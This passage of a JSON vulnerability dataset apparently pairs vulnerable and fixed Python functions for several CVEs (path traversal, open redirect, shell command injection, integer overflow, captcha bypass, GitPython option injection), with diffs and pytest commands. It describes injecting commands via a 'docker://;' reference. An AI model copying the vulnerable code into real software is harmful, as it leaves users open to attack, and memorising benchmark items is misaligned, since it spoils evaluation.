        "start_line": 19,
        "end_line": 25,
        "snippet": "def private_static(filename):\n    # Get path\n    filepath = path.join(app.config.get(\"PRIVATE_DIR\"), filename)\n    if path.isfile(filepath):\n        return send_file(filepath)\n    # End\n    return abort(404)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_376_1",
        "commit": "241d92a4d68f524365a6322b5bbcfaa7d9abc8a3",
        "file_path": "app/helper/middleware.py",
        "start_line": 20,
        "end_line": 26,
        "snippet": "def private_static(filename):\n    # Get path\n    filepath = safe_join(app.config.get(\"PRIVATE_DIR\"), filename)\n    if path.isfile(filepath):\n        return send_file(filepath)\n    # End\n    return abort(404)"
      }
    ],
    "vul_patch": "--- a/app/helper/middleware.py\n+++ b/app/helper/middleware.py\n@@ -1,6 +1,6 @@\n def private_static(filename):\n     # Get path\n-    filepath = path.join(app.config.get(\"PRIVATE_DIR\"), filename)\n+    filepath = safe_join(app.config.get(\"PRIVATE_DIR\"), filename)\n     if path.isfile(filepath):\n         return send_file(filepath)\n     # End\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2020-26215",
    "cve_description": "Jupyter Notebook before version 6.1.5 has an Open redirect vulnerability. A maliciously crafted link to a notebook server could redirect the browser to a different website. All notebook servers are technically affected, however, these maliciously crafted links can only be reasonably made for known notebook server hosts. A link to your notebook server may appear safe, but ultimately redirect to a spoofed server on the public internet. The issue is patched in version 6.1.5.",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/jupyter/notebook",
    "patch_url": [
      "https://github.com/jupyter/notebook/commit/3cec4bbe21756de9f0c4bccf18cf61d840314d74"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_47_1",
        "commit": "d8308e13803ba1c6e92f129381e615af6c6e00d3",
        "file_path": "notebook/base/handlers.py",
        "start_line": 861,
        "end_line": 863,
        "snippet": "    def get(self):\n        self.redirect(self.request.uri.rstrip('/'))\n    "
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_47_1",
        "commit": "3cec4bbe21756de9f0c4bccf18cf61d840314d74",
        "file_path": "notebook/base/handlers.py",
        "start_line": 861,
        "end_line": 867,
        "snippet": "    def get(self):\n        path, *rest = self.request.uri.partition(\"?\")\n        # trim trailing *and* leading /\n        # to avoid misinterpreting repeated '//'\n        path = \"/\" + path.strip(\"/\")\n        new_uri = \"\".join([path, *rest])\n        self.redirect(new_uri)"
      }
    ],
    "vul_patch": "--- a/notebook/base/handlers.py\n+++ b/notebook/base/handlers.py\n@@ -1,3 +1,7 @@\n     def get(self):\n-        self.redirect(self.request.uri.rstrip('/'))\n-    \n+        path, *rest = self.request.uri.partition(\"?\")\n+        # trim trailing *and* leading /\n+        # to avoid misinterpreting repeated '//'\n+        path = \"/\" + path.strip(\"/\")\n+        new_uri = \"\".join([path, *rest])\n+        self.redirect(new_uri)\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2020-26215:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/notebook\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2020-26215/bin/python -m pytest notebook/tests/test_paths.py::RedirectTestCase::test_trailing_slash -p no:warning --disable-warnings\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2020-26215:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/notebook\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2020-26215/bin/python -m pytest notebook/tests/test_paths.py -p no:warning --disable-warnings\n"
  },
  {
    "cve_id": "CVE-2023-39523",
    "cve_description": "ScanCode.io is a server to script and automate software composition analysis with ScanPipe pipelines. Prior to version 32.5.1, the software has a possible command injection vulnerability in the docker fetch process as it allows to append malicious commands in the `docker_reference` parameter.\n\nIn the function `scanpipe/pipes/fetch.py:fetch_docker_image` the parameter `docker_reference` is user controllable. The `docker_reference` variable is then passed to the vulnerable function `get_docker_image_platform`.  However, the `get_docker_image_plaform` function constructs a shell command with the passed `docker_reference`. The `pipes.run_command` then executes the shell command without any prior sanitization, making the function vulnerable to command injections. A malicious user who is able to create or add inputs to a project can inject commands. Although the command injections are blind and the user will not receive direct feedback without logs, it is still possible to cause damage to the server/container. The vulnerability appears for example if a malicious user adds a semicolon after the input of `docker://;`, it would allow appending malicious commands.\n\nVersion 32.5.1 contains a patch for this issue. The `docker_reference` input should be sanitized to avoid command injections and, as a workaround, one may avoid creating commands with user controlled input directly.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/nexB/scancode.io",
    "patch_url": [
      "https://github.com/nexB/scancode.io/commit/07ec0de1964b14bf085a1c9a27ece2b61ab6105c"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_230_1",
        "commit": "2f5a6cc",
        "file_path": "scanpipe/pipes/__init__.py",
        "start_line": 264,
        "end_line": 291,
        "snippet": "def run_command(cmd, log_output=False):\n    \"\"\"\n    Return (exitcode, output) of executing the provided `cmd` in a shell.\n    `cmd` can be provided as a string or as a list of arguments.\n\n    If `log_output` is True, the stdout and stderr of the process will be captured\n    and streamed to the `logger`.\n    \"\"\"\n    if isinstance(cmd, list):\n        cmd = \" \".join(cmd)\n\n    if not log_output:\n        exitcode, output = subprocess.getstatusoutput(cmd)\n        return exitcode, output\n\n    process = subprocess.Popen(\n        cmd,\n        shell=True,\n        stdout=subprocess.PIPE,\n        stderr=subprocess.STDOUT,\n        universal_newlines=True,\n    )\n\n    while _stream_process(process):\n        sleep(1)\n\n    exitcode = process.poll()\n    return exitcode, \"\""
      },
      {
        "id": "vul_py_230_2",
        "commit": "2f5a6cc",
        "file_path": "scanpipe/pipes/fetch.py",
        "start_line": 185,
        "end_line": 232,
        "snippet": "def fetch_docker_image(docker_reference, to=None):\n    \"\"\"\n    Fetch a docker image from the provided Docker image `docker_reference`\n    docker:// reference URL. Return a `download` object.\n\n    Docker references are documented here:\n    https://github.com/containers/skopeo/blob/0faf16017/docs/skopeo.1.md#image-names\n    \"\"\"\n    name = python_safe_name(docker_reference.replace(\"docker://\", \"\"))\n    filename = f\"{name}.tar\"\n    download_directory = to or tempfile.mkdtemp()\n    output_file = Path(download_directory, filename)\n    target = f\"docker-archive:{output_file}\"\n\n    skopeo_executable = _get_skopeo_location()\n    platform_args = []\n    platform = get_docker_image_platform(docker_reference)\n    if platform:\n        os, arch, variant = platform\n        if os:\n            platform_args.append(f\"--override-os={os}\")\n        if arch:\n            platform_args.append(f\"--override-arch={arch}\")\n        if variant:\n            platform_args.append(f\"--override-variant={variant}\")\n    platform_args = \" \".join(platform_args)\n\n    cmd = (\n        f\"{skopeo_executable} copy --insecure-policy \"\n        f\"{platform_args} {docker_reference} {target}\"\n    )\n    logger.info(f\"Fetching image with: {cmd}\")\n    exitcode, output = pipes.run_command(cmd)\n    logger.info(output)\n    if exitcode != 0:\n        raise FetchDockerImageError(output)\n\n    checksums = multi_checksums(output_file, (\"md5\", \"sha1\"))\n\n    return Download(\n        uri=docker_reference,\n        directory=download_directory,\n        filename=filename,\n        path=output_file,\n        size=output_file.stat().st_size,\n        sha1=checksums[\"sha1\"],\n        md5=checksums[\"md5\"],\n    )"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_230_1",
        "commit": "07ec0de",
        "file_path": "scanpipe/pipes/__init__.py",
        "start_line": 264,
        "end_line": 291,
        "snippet": "def run_command(cmd, log_output=False):\n    \"\"\"\n    Return (exitcode, output) of executing the provided `cmd` in a shell.\n    `cmd` can be provided as a string or as a list of arguments.\n\n    If `log_output` is True, the stdout and stderr of the process will be captured\n    and streamed to the `logger`.\n    \"\"\"\n    if isinstance(cmd, list):\n        cmd = \" \".join(cmd)\n\n    if not log_output:\n        exitcode, output = subprocess.getstatusoutput(cmd)\n        return exitcode, output\n\n    process = subprocess.Popen(\n        cmd,\n        shell=False,\n        stdout=subprocess.PIPE,\n        stderr=subprocess.STDOUT,\n        universal_newlines=True,\n    )\n\n    while _stream_process(process):\n        sleep(1)\n\n    exitcode = process.poll()\n    return exitcode, \"\""
      },
      {
        "id": "fix_py_230_2",
        "commit": "07ec0de",
        "file_path": "scanpipe/pipes/fetch.py",
        "start_line": 186,
        "end_line": 238,
        "snippet": "def fetch_docker_image(docker_reference, to=None):\n    \"\"\"\n    Fetch a docker image from the provided Docker image `docker_reference`\n    docker:// reference URL. Return a `download` object.\n\n    Docker references are documented here:\n    https://github.com/containers/skopeo/blob/0faf16017/docs/skopeo.1.md#image-names\n    \"\"\"\n\n    whitelist = r\"^docker://[a-zA-Z0-9_.:/@-]+$\"\n    if not re.match(whitelist, docker_reference):\n        raise ValueError(\"Invalid Docker reference.\")\n\n    name = python_safe_name(docker_reference.replace(\"docker://\", \"\"))\n    filename = f\"{name}.tar\"\n    download_directory = to or tempfile.mkdtemp()\n    output_file = Path(download_directory, filename)\n    target = f\"docker-archive:{output_file}\"\n\n    skopeo_executable = _get_skopeo_location()\n    platform_args = []\n    platform = get_docker_image_platform(docker_reference)\n    if platform:\n        os, arch, variant = platform\n        if os:\n            platform_args.append(f\"--override-os={os}\")\n        if arch:\n            platform_args.append(f\"--override-arch={arch}\")\n        if variant:\n            platform_args.append(f\"--override-variant={variant}\")\n    platform_args = \" \".join(platform_args)\n\n    cmd = (\n        f\"{skopeo_executable} copy --insecure-policy \"\n        f\"{platform_args} {docker_reference} {target}\"\n    )\n    logger.info(f\"Fetching image with: {cmd}\")\n    exitcode, output = pipes.run_command(cmd)\n    logger.info(output)\n    if exitcode != 0:\n        raise FetchDockerImageError(output)\n\n    checksums = multi_checksums(output_file, (\"md5\", \"sha1\"))\n\n    return Download(\n        uri=docker_reference,\n        directory=download_directory,\n        filename=filename,\n        path=output_file,\n        size=output_file.stat().st_size,\n        sha1=checksums[\"sha1\"],\n        md5=checksums[\"md5\"],\n    )"
      }
    ],
    "vul_patch": "--- a/scanpipe/pipes/__init__.py\n+++ b/scanpipe/pipes/__init__.py\n@@ -15,7 +15,7 @@\n \n     process = subprocess.Popen(\n         cmd,\n-        shell=True,\n+        shell=False,\n         stdout=subprocess.PIPE,\n         stderr=subprocess.STDOUT,\n         universal_newlines=True,\n\n--- a/scanpipe/pipes/fetch.py\n+++ b/scanpipe/pipes/fetch.py\n@@ -6,6 +6,11 @@\n     Docker references are documented here:\n     https://github.com/containers/skopeo/blob/0faf16017/docs/skopeo.1.md#image-names\n     \"\"\"\n+\n+    whitelist = r\"^docker://[a-zA-Z0-9_.:/@-]+$\"\n+    if not re.match(whitelist, docker_reference):\n+        raise ValueError(\"Invalid Docker reference.\")\n+\n     name = python_safe_name(docker_reference.replace(\"docker://\", \"\"))\n     filename = f\"{name}.tar\"\n     download_directory = to or tempfile.mkdtemp()\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-32058",
    "cve_description": "Vyper is a Pythonic smart contract language for the Ethereum virtual machine. Prior to version 0.3.8, due to missing overflow check for loop variables, by assigning the iterator of a loop to a variable, it is possible to overflow the type of the latter. The issue seems to happen only in loops of type `for i in range(a, a + N)` as in loops of type `for i in range(start, stop)` and `for i in range(stop)`, the compiler is able to raise a `TypeMismatch` when trying to overflow the variable. The problem has been patched in version 0.3.8.",
    "cwe_info": {
      "CWE-190": {
        "name": "Integer Overflow or Wraparound",
        "description": "The product performs a calculation that can\n         produce an integer overflow or wraparound when the logic\n         assumes that the resulting value will always be larger than\n         the original value. This occurs when an integer value is\n         incremented to a value that is too large to store in the\n         associated representation. When this occurs, the value may\n         become a very small or negative number."
      }
    },
    "repo": "https://github.com/vyperlang/vyper",
    "patch_url": [
      "https://github.com/vyperlang/vyper/commit/3de1415ee77a9244eb04bdb695e249d3ec9ed868"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_417_1",
        "commit": "4f8289a",
        "file_path": "vyper/codegen/stmt.py",
        "start_line": 238,
        "end_line": 286,
        "snippet": "    def _parse_For_range(self):\n        # TODO make sure type always gets annotated\n        if \"type\" in self.stmt.target._metadata:\n            iter_typ = self.stmt.target._metadata[\"type\"]\n        else:\n            iter_typ = INT256_T\n\n        # Get arg0\n        arg0 = self.stmt.iter.args[0]\n        num_of_args = len(self.stmt.iter.args)\n\n        # Type 1 for, e.g. for i in range(10): ...\n        if num_of_args == 1:\n            arg0_val = self._get_range_const_value(arg0)\n            start = IRnode.from_list(0, typ=iter_typ)\n            rounds = arg0_val\n\n        # Type 2 for, e.g. for i in range(100, 110): ...\n        elif self._check_valid_range_constant(self.stmt.iter.args[1]).is_literal:\n            arg0_val = self._get_range_const_value(arg0)\n            arg1_val = self._get_range_const_value(self.stmt.iter.args[1])\n            start = IRnode.from_list(arg0_val, typ=iter_typ)\n            rounds = IRnode.from_list(arg1_val - arg0_val, typ=iter_typ)\n\n        # Type 3 for, e.g. for i in range(x, x + 10): ...\n        else:\n            arg1 = self.stmt.iter.args[1]\n            rounds = self._get_range_const_value(arg1.right)\n            start = Expr.parse_value_expr(arg0, self.context)\n\n        r = rounds if isinstance(rounds, int) else rounds.value\n        if r < 1:\n            return\n\n        varname = self.stmt.target.id\n        i = IRnode.from_list(self.context.fresh_varname(\"range_ix\"), typ=UINT256_T)\n        iptr = self.context.new_variable(varname, iter_typ)\n\n        self.context.forvars[varname] = True\n\n        loop_body = [\"seq\"]\n        # store the current value of i so it is accessible to userland\n        loop_body.append([\"mstore\", iptr, i])\n        loop_body.append(parse_body(self.stmt.body, self.context))\n\n        ir_node = IRnode.from_list([\"repeat\", i, start, rounds, rounds, loop_body])\n        del self.context.forvars[varname]\n\n        return ir_node"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_417_1",
        "commit": "3de1415ee77a9244eb04bdb695e249d3ec9ed868",
        "file_path": "vyper/codegen/stmt.py",
        "start_line": 239,
        "end_line": 289,
        "snippet": "    def _parse_For_range(self):\n        # TODO make sure type always gets annotated\n        if \"type\" in self.stmt.target._metadata:\n            iter_typ = self.stmt.target._metadata[\"type\"]\n        else:\n            iter_typ = INT256_T\n\n        # Get arg0\n        arg0 = self.stmt.iter.args[0]\n        num_of_args = len(self.stmt.iter.args)\n\n        # Type 1 for, e.g. for i in range(10): ...\n        if num_of_args == 1:\n            arg0_val = self._get_range_const_value(arg0)\n            start = IRnode.from_list(0, typ=iter_typ)\n            rounds = arg0_val\n\n        # Type 2 for, e.g. for i in range(100, 110): ...\n        elif self._check_valid_range_constant(self.stmt.iter.args[1]).is_literal:\n            arg0_val = self._get_range_const_value(arg0)\n            arg1_val = self._get_range_const_value(self.stmt.iter.args[1])\n            start = IRnode.from_list(arg0_val, typ=iter_typ)\n            rounds = IRnode.from_list(arg1_val - arg0_val, typ=iter_typ)\n\n        # Type 3 for, e.g. for i in range(x, x + 10): ...\n        else:\n            arg1 = self.stmt.iter.args[1]\n            rounds = self._get_range_const_value(arg1.right)\n            start = Expr.parse_value_expr(arg0, self.context)\n            _, hi = start.typ.int_bounds\n            start = clamp(\"le\", start, hi + 1 - rounds)\n\n        r = rounds if isinstance(rounds, int) else rounds.value\n        if r < 1:\n            return\n\n        varname = self.stmt.target.id\n        i = IRnode.from_list(self.context.fresh_varname(\"range_ix\"), typ=UINT256_T)\n        iptr = self.context.new_variable(varname, iter_typ)\n\n        self.context.forvars[varname] = True\n\n        loop_body = [\"seq\"]\n        # store the current value of i so it is accessible to userland\n        loop_body.append([\"mstore\", iptr, i])\n        loop_body.append(parse_body(self.stmt.body, self.context))\n\n        ir_node = IRnode.from_list([\"repeat\", i, start, rounds, rounds, loop_body])\n        del self.context.forvars[varname]\n\n        return ir_node"
      }
    ],
    "vul_patch": "--- a/vyper/codegen/stmt.py\n+++ b/vyper/codegen/stmt.py\n@@ -27,6 +27,8 @@\n             arg1 = self.stmt.iter.args[1]\n             rounds = self._get_range_const_value(arg1.right)\n             start = Expr.parse_value_expr(arg0, self.context)\n+            _, hi = start.typ.int_bounds\n+            start = clamp(\"le\", start, hi + 1 - rounds)\n \n         r = rounds if isinstance(rounds, int) else rounds.value\n         if r < 1:\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-24880",
    "cve_description": "flask-session-captcha is a package which allows users to extend Flask by adding an image based captcha stored in a server side session. In versions prior to 1.2.1, he `captcha.validate()` function would return `None` if passed no value (e.g. by submitting an having an empty form). If implementing users were checking the return value to be **False**, the captcha verification check could be bypassed. Version 1.2.1 fixes the issue. Users can workaround the issue by not explicitly checking that the value is False. Checking the return value less explicitly should still work.",
    "cwe_info": {
      "CWE-754": {
        "name": "Improper Check for Unusual or Exceptional Conditions",
        "description": "The product does not check or incorrectly checks for unusual or exceptional conditions that are not expected to occur frequently during day to day operation of the product."
      }
    },
    "repo": "https://github.com/Tethik/flask-session-captcha",
    "patch_url": [
      "https://github.com/Tethik/flask-session-captcha/commit/2811ae23a38d33b620fb7a07de8837c6d65c13e4"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_432_1",
        "commit": "50b4053",
        "file_path": "test_flask_session_captcha.py",
        "start_line": 94,
        "end_line": 104,
        "snippet": "    def test_captcha_validate_value(self):\n        captcha = FlaskSessionCaptcha(self.app)\n        _default_routes(captcha, self.app)\n\n        with self.app.test_request_context('/'):\n            captcha.generate()\n            answer = captcha.get_answer()\n            assert not captcha.validate(value=\"wrong\")\n            captcha.generate()\n            answer = captcha.get_answer()\n            assert captcha.validate(value=answer)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_432_1",
        "commit": "2811ae23a38d33b620fb7a07de8837c6d65c13e4",
        "file_path": "test_flask_session_captcha.py",
        "start_line": 94,
        "end_line": 110,
        "snippet": "    def test_captcha_validate_value(self):\n        captcha = FlaskSessionCaptcha(self.app)\n        _default_routes(captcha, self.app)\n\n        with self.app.test_request_context('/'):\n            captcha.generate()\n            answer = captcha.get_answer()\n            assert captcha.validate(value=None) == False\n            captcha.generate()\n            answer = captcha.get_answer()\n            assert captcha.validate(value=\"\") == False\n            captcha.generate()\n            answer = captcha.get_answer()\n            assert captcha.validate(value=\"wrong\") == False\n            captcha.generate()\n            answer = captcha.get_answer()\n            assert captcha.validate(value=answer)"
      }
    ],
    "vul_patch": "--- a/test_flask_session_captcha.py\n+++ b/test_flask_session_captcha.py\n@@ -5,7 +5,13 @@\n         with self.app.test_request_context('/'):\n             captcha.generate()\n             answer = captcha.get_answer()\n-            assert not captcha.validate(value=\"wrong\")\n+            assert captcha.validate(value=None) == False\n+            captcha.generate()\n+            answer = captcha.get_answer()\n+            assert captcha.validate(value=\"\") == False\n+            captcha.generate()\n+            answer = captcha.get_answer()\n+            assert captcha.validate(value=\"wrong\") == False\n             captcha.generate()\n             answer = captcha.get_answer()\n             assert captcha.validate(value=answer)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-40267",
    "cve_description": "GitPython before 3.1.32 does not block insecure non-multi options in clone and clone_from. NOTE: this issue exists because of an incomplete fix for CVE-2022-24439.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/gitpython-developers/GitPython",
    "patch_url": [
      "https://github.com/gitpython-developers/GitPython/commit/ca965ecc81853bca7675261729143f54e5bf4cdd"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_40_1",
        "commit": "c09a71e2caefd5c25195b0b2decc8177d658216a",
        "file_path": "git/repo/base.py",
        "start_line": 1172,
        "end_line": 1255,
        "snippet": "    def _clone(\n        cls,\n        git: \"Git\",\n        url: PathLike,\n        path: PathLike,\n        odb_default_type: Type[GitCmdObjectDB],\n        progress: Union[\"RemoteProgress\", \"UpdateProgress\", Callable[..., \"RemoteProgress\"], None] = None,\n        multi_options: Optional[List[str]] = None,\n        allow_unsafe_protocols: bool = False,\n        allow_unsafe_options: bool = False,\n        **kwargs: Any,\n    ) -> \"Repo\":\n        odbt = kwargs.pop(\"odbt\", odb_default_type)\n\n        # when pathlib.Path or other classbased path is passed\n        if not isinstance(path, str):\n            path = str(path)\n\n        ## A bug win cygwin's Git, when `--bare` or `--separate-git-dir`\n        #  it prepends the cwd or(?) the `url` into the `path, so::\n        #        git clone --bare  /cygwin/d/foo.git  C:\\\\Work\n        #  becomes::\n        #        git clone --bare  /cygwin/d/foo.git  /cygwin/d/C:\\\\Work\n        #\n        clone_path = Git.polish_url(path) if Git.is_cygwin() and \"bare\" in kwargs else path\n        sep_dir = kwargs.get(\"separate_git_dir\")\n        if sep_dir:\n            kwargs[\"separate_git_dir\"] = Git.polish_url(sep_dir)\n        multi = None\n        if multi_options:\n            multi = shlex.split(\" \".join(multi_options))\n\n        if not allow_unsafe_protocols:\n            Git.check_unsafe_protocols(str(url))\n        if not allow_unsafe_options and multi_options:\n            Git.check_unsafe_options(options=multi_options, unsafe_options=cls.unsafe_git_clone_options)\n\n        proc = git.clone(\n            multi,\n            \"--\",\n            Git.polish_url(str(url)),\n            clone_path,\n            with_extended_output=True,\n            as_process=True,\n            v=True,\n            universal_newlines=True,\n            **add_progress(kwargs, git, progress),\n        )\n        if progress:\n            handle_process_output(\n                proc,\n                None,\n                to_progress_instance(progress).new_message_handler(),\n                finalize_process,\n                decode_streams=False,\n            )\n        else:\n            (stdout, stderr) = proc.communicate()\n            cmdline = getattr(proc, \"args\", \"\")\n            cmdline = remove_password_if_present(cmdline)\n\n            log.debug(\"Cmd(%s)'s unused stdout: %s\", cmdline, stdout)\n            finalize_process(proc, stderr=stderr)\n\n        # our git command could have a different working dir than our actual\n        # environment, hence we prepend its working dir if required\n        if not osp.isabs(path):\n            path = osp.join(git._working_dir, path) if git._working_dir is not None else path\n\n        repo = cls(path, odbt=odbt)\n\n        # retain env values that were passed to _clone()\n        repo.git.update_environment(**git.environment())\n\n        # adjust remotes - there may be operating systems which use backslashes,\n        # These might be given as initial paths, but when handling the config file\n        # that contains the remote from which we were clones, git stops liking it\n        # as it will escape the backslashes. Hence we undo the escaping just to be\n        # sure\n        if repo.remotes:\n            with repo.remotes[0].config_writer as writer:\n                writer.set_value(\"url\", Git.polish_url(repo.remotes[0].url))\n        # END handle remote repo\n        return repo"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_40_1",
        "commit": "ca965ec",
        "file_path": "git/repo/base.py",
        "start_line": 1172,
        "end_line": 1257,
        "snippet": "    def _clone(\n        cls,\n        git: \"Git\",\n        url: PathLike,\n        path: PathLike,\n        odb_default_type: Type[GitCmdObjectDB],\n        progress: Union[\"RemoteProgress\", \"UpdateProgress\", Callable[..., \"RemoteProgress\"], None] = None,\n        multi_options: Optional[List[str]] = None,\n        allow_unsafe_protocols: bool = False,\n        allow_unsafe_options: bool = False,\n        **kwargs: Any,\n    ) -> \"Repo\":\n        odbt = kwargs.pop(\"odbt\", odb_default_type)\n\n        # when pathlib.Path or other classbased path is passed\n        if not isinstance(path, str):\n            path = str(path)\n\n        ## A bug win cygwin's Git, when `--bare` or `--separate-git-dir`\n        #  it prepends the cwd or(?) the `url` into the `path, so::\n        #        git clone --bare  /cygwin/d/foo.git  C:\\\\Work\n        #  becomes::\n        #        git clone --bare  /cygwin/d/foo.git  /cygwin/d/C:\\\\Work\n        #\n        clone_path = Git.polish_url(path) if Git.is_cygwin() and \"bare\" in kwargs else path\n        sep_dir = kwargs.get(\"separate_git_dir\")\n        if sep_dir:\n            kwargs[\"separate_git_dir\"] = Git.polish_url(sep_dir)\n        multi = None\n        if multi_options:\n            multi = shlex.split(\" \".join(multi_options))\n\n        if not allow_unsafe_protocols:\n            Git.check_unsafe_protocols(str(url))\n        if not allow_unsafe_options:\n            Git.check_unsafe_options(options=list(kwargs.keys()), unsafe_options=cls.unsafe_git_clone_options)\n        if not allow_unsafe_options and multi_options:\n            Git.check_unsafe_options(options=multi_options, unsafe_options=cls.unsafe_git_clone_options)\n\n        proc = git.clone(\n            multi,\n            \"--\",\n            Git.polish_url(str(url)),\n            clone_path,\n            with_extended_output=True,\n            as_process=True,\n            v=True,\n            universal_newlines=True,\n            **add_progress(kwargs, git, progress),\n        )\n        if progress:\n            handle_process_output(\n                proc,\n                None,\n                to_progress_instance(progress).new_message_handler(),\n                finalize_process,\n                decode_streams=False,\n            )\n        else:\n            (stdout, stderr) = proc.communicate()\n            cmdline = getattr(proc, \"args\", \"\")\n            cmdline = remove_password_if_present(cmdline)\n\n            log.debug(\"Cmd(%s)'s unused stdout: %s\", cmdline, stdout)\n            finalize_process(proc, stderr=stderr)\n\n        # our git command could have a different working dir than our actual\n        # environment, hence we prepend its working dir if required\n        if not osp.isabs(path):\n            path = osp.join(git._working_dir, path) if git._working_dir is not None else path\n\n        repo = cls(path, odbt=odbt)\n\n        # retain env values that were passed to _clone()\n        repo.git.update_environment(**git.environment())\n\n        # adjust remotes - there may be operating systems which use backslashes,\n        # These might be given as initial paths, but when handling the config file\n        # that contains the remote from which we were clones, git stops liking it\n        # as it will escape the backslashes. Hence we undo the escaping just to be\n        # sure\n        if repo.remotes:\n            with repo.remotes[0].config_writer as writer:\n                writer.set_value(\"url\", Git.polish_url(repo.remotes[0].url))\n        # END handle remote repo\n        return repo"
      }
    ],
    "vul_patch": "--- a/git/repo/base.py\n+++ b/git/repo/base.py\n@@ -32,6 +32,8 @@\n \n         if not allow_unsafe_protocols:\n             Git.check_unsafe_protocols(str(url))\n+        if not allow_unsafe_options:\n+            Git.check_unsafe_options(options=list(kwargs.keys()), unsafe_options=cls.unsafe_git_clone_options)\n         if not allow_unsafe_options and multi_options:\n             Git.check_unsafe_options(options=multi_options, unsafe_options=cls.unsafe_git_clone_options)\n \n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2023-40267:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/GitPython\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2023-40267/bin/python  -m pytest test/test_repo.py::TestRepo::test_clone_unsafe_options  test/test_repo.py::TestRepo::test_clone_from_unsafe_options -v\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2023-40267:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/GitPython\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2023-40267/bin/python  -m pytest test/test_repo.py -v -k \"not test_archive and not test_clone_from_with_path_contains_unicode and not test_commit_from_revision and not test_commits and not test_creation_deletion and not test_do_not_strip_newline_in_stdout and not test_is_ancestor and not test_is_valid_object and not test_merge_base and not test_rebasing and not test_remote_method and not test_repo_creation_from_different_paths and not test_repo_creation_pathlib and not test_rev_parse and not test_submodule_update and not test_submodules and not test_tag and not test_tree_from_revision and not test_trees\" -p no:warning --disable-warnings\n\n"
  },
  {
    "cve_id": "CVE-2025-27781",
    "cve_description": "Applio is a voice conversion tool. Versions 3.2.8-bugfix and prior are vulnerable to unsafe deserialization in inference.py. `model_file` in inference.py as well as `model_file` in tts.py take user-supplied input (e.g. a path to a model) and pass that value to the `change_choices` and later to `get_speakers_id` function, which loads that model with `torch.load` in inference.py (line 326 in 3.2.8-bugfix), which is vulnerable to unsafe deserialization. The issue can lead to remote code execution. A patch is available on the `main` branch of the repository.",
    "cwe_info": {
      "CWE-502": {
        "name": "Deserialization of Untrusted Data",
        "description": "The product deserializes untrusted data without sufficiently ensuring that the resulting data will be valid."
      }
    },
    "repo": "https://github.com/IAHispano/Applio",
    "patch_url": [
      "https://github.com/IAHispano/Applio/commit/eb21d9dd349a6ae1a28c440b30d306eafba65097"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_100_1",
        "commit": "c5c4bf4",
        "file_path": "rvc/train/train.py",
        "start_line": "136",
        "end_line": "152",
